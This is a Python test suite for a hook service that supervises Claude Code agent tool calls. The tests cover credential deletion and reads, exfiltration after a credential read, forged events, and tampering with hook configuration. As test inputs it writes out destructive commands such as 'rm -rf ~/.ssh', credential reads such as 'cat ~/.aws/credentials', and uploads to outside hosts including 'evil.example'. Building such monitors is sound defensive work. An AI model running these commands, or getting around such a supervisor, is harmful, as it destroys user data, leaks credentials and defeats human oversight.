"""Claude Code hook adapter: the plan's test matrix (docs/Week 16 Plan.md §7).

Fixtures are injected: a fake settings-facts collector stands in for the
root-owned managed file, and an in-memory audit store records every row.
"""

from __future__ import annotations

import json
import os
import tempfile
import threading
import unittest
from pathlib import Path
from typing import Any

from fastapi.testclient import TestClient

from sentinel.api.main import create_app
from sentinel.audit import SQLiteAuditStore
from sentinel.audit.models import AuditEvent, AuditQuery
from sentinel.hosts.claude_code import ClaudeCodeHookService
from sentinel.hosts.claude_code.install import doctor, managed_fragment
from sentinel.hosts.claude_code.settings_check import SettingsFacts, evaluate_enforcement
from sentinel.supervision.floor_policy import FloorPolicy, FloorPolicyError, HookExpectations, SQLiteFloorPolicyStore

HOME = "/Users/dev"
PROJ = "/Users/dev/proj"
HOST_HEADER = {"host": "127.0.0.1:8000"}
URL = "http://127.0.0.1:8000/hooks/claude-code/pre-tool-use"


def good_managed_content(url: str = URL) -> dict[str, Any]:
    return managed_fragment(FloorPolicy(hook=HookExpectations(server_url=url)), python="/usr/bin/python3")


def facts(content: dict[str, Any] | None = None, *, exists: bool = True, owner: int = 0, mode: int = 0o644,
          listener: str = "sentinel") -> SettingsFacts:
    return SettingsFacts(path="/managed.json", exists=exists, owner_uid=owner, mode=mode,
                         content=content if content is not None else good_managed_content(), listener=listener)  # type: ignore[arg-type]


class MemoryAudit:
    def __init__(self, fail_required: bool = False) -> None:
        self.events: list[AuditEvent] = []
        self.fail_required = fail_required
        self._lock = threading.Lock()

    @property
    def health(self):  # pragma: no cover - interface completeness
        raise NotImplementedError

    def write(self, event: AuditEvent) -> None:
        with self._lock:
            self.events.append(event)

    def write_required(self, event: AuditEvent) -> None:
        if self.fail_required:
            raise RuntimeError("disk full")
        self.write(event)

    def query(self, filters=None, **values):
        session_id = values.get("session_id") or (filters.session_id if filters else None)
        return [e for e in self.events if session_id is None or e.session_id == session_id]

    def export_jsonl(self, *a, **k):  # pragma: no cover
        return 0

    def decisions(self, session_id: str | None = None) -> list[AuditEvent]:
        return [e for e in self.events if e.event_type == "decision" and (session_id is None or e.session_id == session_id)]


def make_service(audit=None, *, policy: FloorPolicy | None = None, facts_fn=None, snapshots=None, home: str = HOME, **kwargs):
    audit = audit if audit is not None else MemoryAudit()
    snap = snapshots if snapshots is not None else {}
    service = ClaudeCodeHookService(
        policy=policy or FloorPolicy(), audit_store=audit, home=home, managed_settings=Path("/managed.json"),
        facts_collector=facts_fn or (lambda: facts()),
        snapshot_reader=lambda path: snap.get(str(path)),
        **kwargs,
    )
    return service, audit


def pre(tool: str, tool_input: dict[str, Any], *, session: str = "s1", cwd: str = PROJ, tool_use_id: str = "t1",
        mode: str | None = "default", **extra) -> dict[str, Any]:
    body = {"session_id": session, "hook_event_name": "PreToolUse", "cwd": cwd, "tool_name": tool,
            "tool_input": tool_input, "tool_use_id": tool_use_id, "transcript_path": "/x", "permission_mode": mode}
    body.update(extra)
    return body


def kind(response: dict[str, Any]) -> str:
    hook = response.get("hookSpecificOutput") or {}
    return hook.get("permissionDecision") or ("context" if hook.get("additionalContext") else "empty")


class ResponseContract(unittest.TestCase):
    def test_allow_is_an_empty_body_never_permission_allow(self) -> None:
        service, audit = make_service()
        self.assertEqual(service.pre_tool_use(pre("Bash", {"command": "npm test"})), {})
        self.assertEqual(audit.decisions()[0].verdict, "allow")

    def test_warn_is_context_only(self) -> None:
        service, _ = make_service()
        body = service.pre_tool_use(pre("Bash", {"command": "git reset --hard"}))
        self.assertEqual(kind(body), "context")
        self.assertIn("Sentinel note", body["hookSpecificOutput"]["additionalContext"])

    def test_confirm_is_ask_every_time(self) -> None:
        service, audit = make_service()
        for i in range(3):
            body = service.pre_tool_use(pre("Bash", {"command": "rm -rf ../other"}, tool_use_id=f"t{i}"))
            self.assertEqual(kind(body), "ask", body)
        self.assertEqual([e.verdict for e in audit.decisions()], ["confirm_required"] * 3)
        self.assertTrue(all(e.decision.judgment.message == "sent" for e in audit.decisions()))

    def test_block_is_deny_with_guidance(self) -> None:
        service, audit = make_service()
        service.session_start({"session_id": "s1", "project_dir": PROJ, "claude_version": "2.1.296"})
        body = service.pre_tool_use(pre("Bash", {"command": "rm -rf ~/.ssh"}))
        self.assertEqual(kind(body), "deny")
        self.assertNotIn("systemMessage", body)  # enforcement is mandatory in this fixture
        row = audit.decisions()[0]
        self.assertEqual(row.reason_codes, ["F1.delete_credential"])
        self.assertTrue(row.decision.judgment.agent_guidance)

    def test_block_under_advisory_enforcement_says_so(self) -> None:
        service, audit = make_service(facts_fn=lambda: facts(owner=501))
        body = service.pre_tool_use(pre("Bash", {"command": "rm -rf ~/.ssh"}))
        self.assertEqual(kind(body), "deny")
        self.assertIn("doctor", body["systemMessage"])
        self.assertEqual(audit.decisions()[0].details["enforcement"], "advisory")
        self.assertIn("managed_settings_not_root_owned", audit.decisions()[0].details["enforcement_failed"])

    def test_unknown_fields_are_ignored(self) -> None:
        service, _ = make_service()
        body = service.pre_tool_use(pre("Bash", {"command": "ls", "new_flag": True}, brand_new_top_level={"x": 1}))
        self.assertEqual(body, {})

    def test_ask_fallback_mode_delivers_deny_with_guidance(self) -> None:
        policy = FloorPolicy(ask_fallback_modes=frozenset({"bypassPermissions"}))
        service, audit = make_service(policy=policy)
        body = service.pre_tool_use(pre("Bash", {"command": "rm -rf ../other"}, mode="bypassPermissions"))
        self.assertEqual(kind(body), "deny")
        self.assertIn("confirmation", body["hookSpecificOutput"]["permissionDecisionReason"])
        self.assertEqual(audit.decisions()[0].verdict, "confirm_required")

    def test_log_only_rule_records_the_real_verdict_but_passes(self) -> None:
        policy = FloorPolicy(log_only_rules=frozenset({"F5.destructive_outside"}))
        service, audit = make_service(policy=policy)
        body = service.pre_tool_use(pre("Bash", {"command": "rm -rf ../other"}))
        self.assertEqual(body, {})
        row = audit.decisions()[0]
        self.assertEqual(row.verdict, "confirm_required")
        self.assertTrue(row.details["log_only"])


class ToolMapping(unittest.TestCase):
    def test_write_tools_use_the_path_floor(self) -> None:
        service, audit = make_service()
        self.assertEqual(kind(service.pre_tool_use(pre("Write", {"file_path": f"{PROJ}/a.py", "content": "x"}))), "empty")
        self.assertEqual(kind(service.pre_tool_use(pre("Edit", {"file_path": f"{HOME}/.zshrc", "old_string": "a", "new_string": "b"}, tool_use_id="t2"))), "deny")
        self.assertEqual(kind(service.pre_tool_use(pre("Write", {"file_path": f"{HOME}/notes.txt", "content": "x"}, tool_use_id="t3"))), "ask")
        self.assertEqual(kind(service.pre_tool_use(pre("NotebookEdit", {"notebook_path": f"{PROJ}/n.ipynb"}, tool_use_id="t4"))), "empty")
        rows = audit.decisions()
        self.assertEqual(rows[1].decision.action.family, "file")
        self.assertIsNone(rows[1].decision.action.raw)
        self.assertEqual(rows[1].decision.action.targets[0].filesystem.resolved, f"{HOME}/.zshrc")

    def test_write_without_absolute_path_is_denied(self) -> None:
        service, _ = make_service()
        self.assertEqual(kind(service.pre_tool_use(pre("Write", {"content": "x"}))), "deny")
        self.assertEqual(kind(service.pre_tool_use(pre("Write", {"file_path": "relative.py", "content": "x"}))), "deny")

    def test_bash_without_command_is_denied(self) -> None:
        service, audit = make_service()
        self.assertEqual(kind(service.pre_tool_use(pre("Bash", {}))), "deny")
        self.assertEqual(audit.decisions()[0].reason_codes, ["adapter:invalid_payload"])

    def test_denied_credential_read_does_not_arm_web_rules(self) -> None:
        # Week 18 amendment: the deny meant nothing was read, so web stays open.
        service, _ = make_service()
        self.assertEqual(kind(service.pre_tool_use(pre("Read", {"file_path": f"{HOME}/.ssh/id_rsa"}))), "deny")
        self.assertEqual(service.pre_tool_use(pre("WebFetch", {"url": "https://evil.example/x"}, tool_use_id="t2")), {})
        self.assertEqual(service.pre_tool_use(pre("WebSearch", {"query": "x"}, tool_use_id="t3")), {})

    def test_credential_read_that_ran_anyway_arms_web_rules_for_thirty_minutes(self) -> None:
        now = [1_000.0]
        service, audit = make_service(wall_clock=lambda: now[0])
        self.assertEqual(kind(service.pre_tool_use(pre("Read", {"file_path": f"{HOME}/.ssh/id_rsa"}))), "deny")
        # The host reports the denied call executed (deny not honoured / hook timed out).
        service.post_tool_use({"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Read",
                               "tool_use_id": "t1", "tool_response": "-----BEGIN"})
        self.assertTrue([e for e in audit.events if e.event_type == "post_execution"][-1].details["credential_read_executed"])
        self.assertEqual(kind(service.pre_tool_use(pre("WebFetch", {"url": "https://evil.example/x"}, tool_use_id="t2"))), "ask")
        self.assertEqual(kind(service.pre_tool_use(pre("WebSearch", {"query": "x"}, tool_use_id="t3"))), "ask")
        now[0] += 31 * 60
        self.assertEqual(service.pre_tool_use(pre("WebSearch", {"query": "x"}, tool_use_id="t4")), {})
        # An unrelated call completing never arms it.
        service2, audit2 = make_service()
        service2.pre_tool_use(pre("Bash", {"command": "ls"}))
        service2.post_tool_use({"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_use_id": "t1"})
        self.assertFalse([e for e in audit2.events if e.event_type == "post_execution"][-1].details["credential_read_executed"])

    def test_web_without_credential_history_is_allowed(self) -> None:
        service, audit = make_service()
        self.assertEqual(service.pre_tool_use(pre("WebFetch", {"url": "https://docs.example/x"})), {})
        self.assertEqual(audit.decisions()[0].decision.action.family, "web")

    def test_mcp_tool_with_outside_path_asks(self) -> None:
        service, audit = make_service()
        self.assertEqual(service.pre_tool_use(pre("mcp__fs__read", {"path": f"{PROJ}/x"}, mcp_server={"name": "fs", "source": "project"})), {})
        body = service.pre_tool_use(pre("mcp__fs__read", {"path": f"{HOME}/.ssh/id_rsa"}, tool_use_id="t2", mcp_server={"name": "fs", "source": "project"}))
        self.assertEqual(kind(body), "ask")
        self.assertEqual(audit.decisions()[1].reason_codes, ["F5.mcp_path_outside"])

    def test_mcp_source_not_accepted_asks(self) -> None:
        policy = FloorPolicy(accepted_mcp_sources=frozenset({"project"}))
        service, _ = make_service(policy=policy)
        body = service.pre_tool_use(pre("mcp__x__y", {"q": "hi"}, mcp_server={"name": "x", "source": "user"}))
        self.assertEqual(kind(body), "ask")

    def test_other_tools_pass_with_a_row(self) -> None:
        service, audit = make_service()
        self.assertEqual(service.pre_tool_use(pre("AskUserQuestion", {"q": "x"})), {})
        self.assertEqual(audit.decisions()[0].verdict, "allow")

    def test_cwd_moves_but_boundary_does_not(self) -> None:
        service, audit = make_service()
        service.pre_tool_use(pre("Bash", {"command": "ls"}))
        body = service.pre_tool_use(pre("Bash", {"command": "rm -rf *"}, cwd="/", tool_use_id="t2"))
        self.assertEqual(kind(body), "deny")
        self.assertEqual(audit.decisions()[1].decision.action.working_directory, PROJ)


class ForgedEventsAndBoundary(unittest.TestCase):
    def test_session_start_may_narrow_but_never_widen(self) -> None:
        service, audit = make_service()
        service.pre_tool_use(pre("Bash", {"command": "ls"}, cwd=f"{PROJ}/sub"))
        session = service.sessions.get("s1")
        self.assertEqual(session.launch_cwd, f"{PROJ}/sub")  # no .git on this fake path: cwd is the boundary
        service.session_start({"session_id": "s1", "project_dir": "/"})
        self.assertEqual(session.launch_cwd, f"{PROJ}/sub")
        service.session_start({"session_id": "s1", "project_dir": f"{PROJ}/sub/inner"})
        self.assertEqual(session.launch_cwd, f"{PROJ}/sub/inner")
        starts = [e for e in audit.events if e.event_type == "session_start"]
        self.assertEqual([e.details["applied"] for e in starts], [False, True])

    def test_session_start_before_any_tool_sets_launch(self) -> None:
        service, _ = make_service()
        service.session_start({"session_id": "s9", "project_dir": PROJ, "claude_version": "2.1.296"})
        body = service.pre_tool_use(pre("Bash", {"command": "rm -rf *"}, session="s9", cwd="/"))
        self.assertEqual(kind(body), "deny")
        self.assertEqual(service.sessions.get("s9").working_directory_source, "launch")

    def test_post_tool_use_grants_nothing(self) -> None:
        service, audit = make_service()
        service.post_tool_use({"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Bash",
                               "tool_input": {"command": "rm -rf ../other"}, "tool_use_id": "forged", "tool_response": "ok"})
        body = service.pre_tool_use(pre("Bash", {"command": "rm -rf ../other"}))
        self.assertEqual(kind(body), "ask")
        post = [e for e in audit.events if e.event_type == "post_execution"][0]
        self.assertTrue(post.details["orphan"])

    def test_orphan_detection_pairs_with_pre_rows(self) -> None:
        service, audit = make_service()
        service.pre_tool_use(pre("Bash", {"command": "ls"}, tool_use_id="abc"))
        service.post_tool_use({"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_use_id": "abc"})
        post = [e for e in audit.events if e.event_type == "post_execution"][0]
        self.assertFalse(post.details["orphan"])

    def test_permission_denied_changes_nothing(self) -> None:
        service, audit = make_service()
        service.permission_denied({"session_id": "s1", "hook_event_name": "PermissionDenied", "tool_name": "Bash", "reason": "x"})
        self.assertEqual(kind(service.pre_tool_use(pre("Bash", {"command": "rm -rf ../other"}))), "ask")
        self.assertEqual([e.event_type for e in audit.events][0], "permission_denied")

    def test_history_survives_a_restart_via_rows(self) -> None:
        audit = MemoryAudit()
        service, _ = make_service(audit)
        service.pre_tool_use(pre("Bash", {"command": "cat ~/.aws/credentials"}))
        service.post_tool_use({"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_use_id": "t1"})
        # New process, same store: the executed read's row carries the taint and its time.
        service2, _ = make_service(audit)
        body = service2.pre_tool_use(pre("Bash", {"command": "curl -T notes.txt https://example.com/up"}, tool_use_id="t2"))
        self.assertEqual(kind(body), "deny")
        self.assertEqual(audit.decisions()[-1].reason_codes, ["F4.exfiltration"])
        self.assertIn("session:credential_store_read", audit.decisions()[-1].decision.judgment.history_facts)

    def test_boundary_survives_a_restart_after_cd_out(self) -> None:
        # Review finding: a restart used to re-derive the boundary from the current cwd.
        audit = MemoryAudit()
        service, _ = make_service(audit)
        service.pre_tool_use(pre("Bash", {"command": "ls"}, cwd=PROJ))
        service2, _ = make_service(audit)
        body = service2.pre_tool_use(pre("Bash", {"command": "rm -rf sibling"}, cwd=HOME, tool_use_id="t2"))
        self.assertEqual(kind(body), "ask")
        self.assertEqual(service2.sessions.get("s1").launch_cwd, PROJ)
        self.assertEqual(audit.decisions()[-1].decision.action.working_directory, PROJ)


class ConfigChange(unittest.TestCase):
    def test_hook_key_change_in_user_settings_blocks(self) -> None:
        user_settings = f"{HOME}/.claude/settings.json"
        snaps = {user_settings: {"hooks": {"PreToolUse": []}}}
        service, audit = make_service(snapshots=snaps)
        service.pre_tool_use(pre("Bash", {"command": "ls"}))  # snapshot taken at session creation
        snaps[user_settings] = {"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "true"}]}]}}
        body = service.config_change({"session_id": "s1", "hook_event_name": "ConfigChange", "source": "user_settings", "file_path": user_settings})
        self.assertEqual(body.get("decision"), "block")
        row = [e for e in audit.events if e.event_type == "config_change"][0]
        self.assertEqual(row.verdict, "block")
        self.assertEqual(row.decision.judgment.rule_id, "F2.hook_config_change")

    def test_unrelated_settings_change_passes(self) -> None:
        user_settings = f"{HOME}/.claude/settings.json"
        snaps = {user_settings: {"hooks": {"PreToolUse": []}}}
        service, _ = make_service(snapshots=snaps)
        service.pre_tool_use(pre("Bash", {"command": "ls"}))
        body = service.config_change({"session_id": "s1", "hook_event_name": "ConfigChange", "source": "user_settings", "file_path": user_settings})
        self.assertEqual(body, {})

    def test_skills_change_blocks(self) -> None:
        service, _ = make_service()
        service.pre_tool_use(pre("Bash", {"command": "ls"}))
        body = service.config_change({"session_id": "s1", "hook_event_name": "ConfigChange", "source": "skills", "file_path": f"{PROJ}/.claude/skills/x/SKILL.md"})
        self.assertEqual(body.get("decision"), "block")

    def test_policy_settings_change_reevaluates_enforcement(self) -> None:
        state = {"good": True}
        service, _ = make_service(facts_fn=lambda: facts() if state["good"] else facts(exists=False))
        service.session_start({"session_id": "s1", "project_dir": PROJ, "claude_version": "2.1.296"})
        service.pre_tool_use(pre("Bash", {"command": "ls"}))
        self.assertEqual(service.sessions.get("s1").enforcement.state, "mandatory")
        state["good"] = False
        service.config_change({"session_id": "s1", "hook_event_name": "ConfigChange", "source": "policy_settings"})
        self.assertNotEqual(service.sessions.get("s1").enforcement.state, "mandatory")


class FailClosed(unittest.TestCase):
    def test_audit_write_failure_denies(self) -> None:
        audit = MemoryAudit(fail_required=True)
        service, _ = make_service(audit)
        body = service.pre_tool_use(pre("Bash", {"command": "ls"}))
        self.assertEqual(kind(body), "deny")
        self.assertIn("audit", body["hookSpecificOutput"]["permissionDecisionReason"].lower())
        self.assertEqual(audit.events[-1].reason_codes, ["audit:write_failed"])

    def test_invalid_payload_denies(self) -> None:
        service, _ = make_service()
        self.assertEqual(kind(service.pre_tool_use({"tool_name": "Bash"})), "deny")
        self.assertEqual(kind(service.pre_tool_use("not a dict")), "deny")

    def test_floor_exception_denies(self) -> None:
        service, audit = make_service()
        import sentinel.hosts.claude_code.service as module

        original = module.decide_shell
        module.decide_shell = lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom"))
        try:
            body = service.pre_tool_use(pre("Bash", {"command": "ls"}))
        finally:
            module.decide_shell = original
        self.assertEqual(kind(body), "deny")
        self.assertEqual(audit.decisions()[0].reason_codes, ["adapter:floor_error"])

    def test_row_is_written_before_every_answer(self) -> None:
        service, audit = make_service()
        for i, cmd in enumerate(["ls", "rm -rf ../x", "rm -rf ~", "git reset --hard"]):
            service.pre_tool_use(pre("Bash", {"command": cmd}, tool_use_id=f"t{i}"))
        self.assertEqual([e.request_id for e in audit.decisions()], ["t0", "t1", "t2", "t3"])
        self.assertTrue(all(e.decision is not None and e.decision.judgment.latency_ms is not None for e in audit.decisions()))


class Concurrency(unittest.TestCase):
    def test_parallel_calls_each_get_a_row(self) -> None:
        service, audit = make_service()
        errors: list[BaseException] = []

        def worker(i: int) -> None:
            try:
                body = service.pre_tool_use(pre("Bash", {"command": f"echo {i}"}, tool_use_id=f"p{i}"))
                assert body == {}
            except BaseException as exc:  # noqa: BLE001
                errors.append(exc)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(40)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        self.assertEqual(errors, [])
        self.assertEqual(len(audit.decisions()), 40)
        self.assertEqual(len({e.request_id for e in audit.decisions()}), 40)


class Enforcement(unittest.TestCase):
    def test_good_file_is_mandatory(self) -> None:
        report = evaluate_enforcement(facts(), HookExpectations(), claude_version="2.1.296", liveness=True)
        self.assertEqual((report.state, report.failed), ("mandatory", ()))

    def test_each_defect_is_named(self) -> None:
        cases = {
            "managed_settings_not_root_owned": facts(owner=501),
            "managed_settings_group_or_world_writable": facts(mode=0o666),
            "allow_managed_hooks_only_not_set": facts({**good_managed_content(), "allowManagedHooksOnly": False}),
            "allowed_http_hook_urls_not_pinned": facts({**good_managed_content(), "allowedHttpHookUrls": ["http://127.0.0.1:9999/*"]}),
            "pre_tool_use_entry_missing": facts({**good_managed_content(), "hooks": {}}),
            "foreign_listener_on_sentinel_port": facts(listener="foreign"),
        }
        for expected, f in cases.items():
            with self.subTest(expected):
                report = evaluate_enforcement(f, HookExpectations(), claude_version="2.1.296", liveness=True)
                self.assertEqual(report.state, "advisory")
                self.assertIn(expected, report.failed)

    def test_matcher_and_on_failure_checks(self) -> None:
        content = good_managed_content()
        content["hooks"]["PreToolUse"][0]["matcher"] = "Bash"
        content["hooks"]["PreToolUse"][0]["hooks"][0]["onFailure"] = "ignore"
        content["hooks"]["PreToolUse"][0]["hooks"][0]["timeout"] = 60
        report = evaluate_enforcement(facts(content), HookExpectations(), claude_version="2.1.296", liveness=True)
        self.assertIn("matcher_missing:Write", report.failed)
        self.assertIn("matcher_missing:mcp__.*", report.failed)
        self.assertIn("on_failure_not_block", report.failed)
        self.assertIn("timeout_too_long", report.failed)

    def test_old_version_is_advisory(self) -> None:
        report = evaluate_enforcement(facts(), HookExpectations(), claude_version="2.1.200", liveness=True)
        self.assertIn("claude_version_too_old", report.failed)

    def test_missing_file_with_live_hooks_is_unknown(self) -> None:
        report = evaluate_enforcement(facts(exists=False), HookExpectations(), claude_version="2.1.296", liveness=True)
        self.assertEqual(report.state, "unknown")
        self.assertEqual(evaluate_enforcement(facts(exists=False), HookExpectations(), claude_version="2.1.296", liveness=False).state, "advisory")

    def test_doctor_reads_a_real_file(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "managed-settings.json"
            path.write_text(json.dumps(good_managed_content()))
            result = doctor(FloorPolicy(), claude_version="2.1.296", probe=False, settings_path=path)
            self.assertFalse(result.ok)  # not root-owned in a temp dir
            self.assertIn("managed_settings_not_root_owned", result.failed)


class FloorPolicyRules(unittest.TestCase):
    def test_protected_rules_cannot_be_log_only(self) -> None:
        for rule in ["F1.delete_home", "F2.supervisor_disable", "F3.credential_read", "F4.exfiltration"]:
            with self.subTest(rule), self.assertRaises(FloorPolicyError):
                FloorPolicy(log_only_rules=frozenset({rule}))
        FloorPolicy(log_only_rules=frozenset({"F5.destructive_outside"}))

    def test_unknown_rule_rejected(self) -> None:
        with self.assertRaises(FloorPolicyError):
            FloorPolicy(log_only_rules=frozenset({"F9.nope"}))

    def test_environment_longest_prefix(self) -> None:
        policy = FloorPolicy(environments={"/srv": "staging", "/srv/prod": "production"})
        self.assertEqual(policy.environment_for("/srv/prod/app"), "production")
        self.assertEqual(policy.environment_for("/srv/other"), "staging")
        self.assertEqual(policy.environment_for("/home/x"), "dev")

    def test_hook_url_must_be_loopback(self) -> None:
        with self.assertRaises(FloorPolicyError):
            FloorPolicy(hook=HookExpectations(server_url="http://0.0.0.0:8000/hooks/claude-code/pre-tool-use"))

    def test_hash_changes_with_policy(self) -> None:
        self.assertNotEqual(FloorPolicy().content_sha256, FloorPolicy(message_budget_per_boundary=1).content_sha256)

    def test_store_binds_once_and_refuses_a_different_policy(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            db = Path(tmp) / "state.sqlite3"
            store = SQLiteFloorPolicyStore(db)
            store.bind(FloorPolicy())
            store.bind(FloorPolicy())
            with self.assertRaises(FloorPolicyError) as ctx:
                store.bind(FloorPolicy(message_budget_per_boundary=1))
            self.assertEqual(ctx.exception.reason_code, "floor_policy:binding_mismatch")
            store.close()

    def test_v1_state_database_is_refused_by_name(self) -> None:
        from sentinel.control.workspace import review_workspace
        from sentinel.supervision import SQLiteSupervisionPolicyStore, week12_fixture_policy
        from sentinel.control.workspace import SQLiteWorkspaceBindingStore

        with tempfile.TemporaryDirectory() as tmp:
            db = Path(tmp) / "state.sqlite3"
            (Path(tmp) / ".git").mkdir()
            workspace = review_workspace(Path(tmp))
            binding = SQLiteWorkspaceBindingStore(db).bind(workspace)
            v1 = SQLiteSupervisionPolicyStore(db)
            v1.bind(week12_fixture_policy(), binding)
            v1.close()
            store = SQLiteFloorPolicyStore(db)
            with self.assertRaises(FloorPolicyError) as ctx:
                store.bind(FloorPolicy())
            self.assertEqual(ctx.exception.reason_code, "floor_policy:v1_state_database")
            self.assertIn(str(db), str(ctx.exception))
            store.close()


class HttpSurface(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        db = os.path.join(self.tmp.name, "state.sqlite3")
        self.store = SQLiteAuditStore(db)
        self.service, _ = make_service(self.store)
        self.app = create_app(audit_store=self.store, claude_code_service=self.service, load_policy=False)
        self.client = TestClient(self.app)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_routes_answer_200_with_json(self) -> None:
        r = self.client.post("/hooks/claude-code/pre-tool-use", json=pre("Bash", {"command": "rm -rf ~"}), headers=HOST_HEADER)
        self.assertEqual(r.status_code, 200)
        self.assertEqual(kind(r.json()), "deny")
        self.assertEqual(self.store.query(session_id="s1")[0].verdict, "block")

    def test_bad_json_is_a_deny_not_a_422(self) -> None:
        r = self.client.post("/hooks/claude-code/pre-tool-use", content=b"{not json", headers={**HOST_HEADER, "content-type": "application/json"})
        self.assertEqual(r.status_code, 200)
        self.assertEqual(kind(r.json()), "deny")

    def test_browser_and_wrong_host_are_rejected(self) -> None:
        r = self.client.post("/hooks/claude-code/pre-tool-use", json=pre("Bash", {"command": "ls"}), headers={**HOST_HEADER, "origin": "http://127.0.0.1:3000"})
        self.assertEqual(r.status_code, 403)
        r = self.client.post("/hooks/claude-code/pre-tool-use", json=pre("Bash", {"command": "ls"}), headers={"host": "localhost:8000"})
        self.assertEqual(r.status_code, 421)

    def test_large_write_payload_is_not_a_413(self) -> None:
        big = pre("Write", {"file_path": f"{PROJ}/big.txt", "content": "x" * 200_000})
        r = self.client.post("/hooks/claude-code/pre-tool-use", json=big, headers=HOST_HEADER)
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json(), {})

    def test_other_routes_never_deny(self) -> None:
        for path in ["post-tool-use", "permission-request", "permission-denied", "config-change", "session"]:
            with self.subTest(path):
                r = self.client.post(f"/hooks/claude-code/{path}", content=b"garbage", headers=HOST_HEADER)
                self.assertEqual((r.status_code, r.json()), (200, {}))

    def test_restart_rebuilds_from_sqlite(self) -> None:
        self.client.post("/hooks/claude-code/pre-tool-use", json=pre("Read", {"file_path": f"{HOME}/.ssh/id_rsa"}), headers=HOST_HEADER)
        # Denied only: a restart sees no taint, the upload is judged alone (F6 ask).
        untainted, _ = make_service(self.store)
        self.assertEqual(kind(untainted.pre_tool_use(pre("Bash", {"command": "scp notes.txt me@host:/tmp/"}, tool_use_id="t2"))), "ask")
        # An ordinary call completing writes `credential_read_executed: false`;
        # through the real store's redaction that must stay a boolean, not a
        # truthy "[REDACTED]", or every restart would arm the taint (live find, Oct 14).
        self.client.post("/hooks/claude-code/pre-tool-use", json=pre("Bash", {"command": "ls"}, tool_use_id="t9"), headers=HOST_HEADER)
        self.client.post("/hooks/claude-code/post-tool-use",
                         json={"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_use_id": "t9"},
                         headers=HOST_HEADER)
        stored = [e for e in self.store.query(AuditQuery(session_id="s1", limit=1000)) if e.event_type == "post_execution"][-1]
        self.assertIs(stored.details["credential_read_executed"], False)
        still_untainted, _ = make_service(self.store)
        self.assertEqual(kind(still_untainted.pre_tool_use(pre("Bash", {"command": "scp notes.txt me@host:/tmp/"}, tool_use_id="t10"))), "ask")
        # The host reports the denied read ran anyway: the row carries the taint across a restart.
        self.client.post("/hooks/claude-code/post-tool-use",
                         json={"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_use_id": "t1"},
                         headers=HOST_HEADER)
        service2, _ = make_service(self.store)
        body = service2.pre_tool_use(pre("Bash", {"command": "scp notes.txt me@host:/tmp/"}, tool_use_id="t3"))
        self.assertEqual(kind(body), "deny")


if __name__ == "__main__":
    unittest.main()
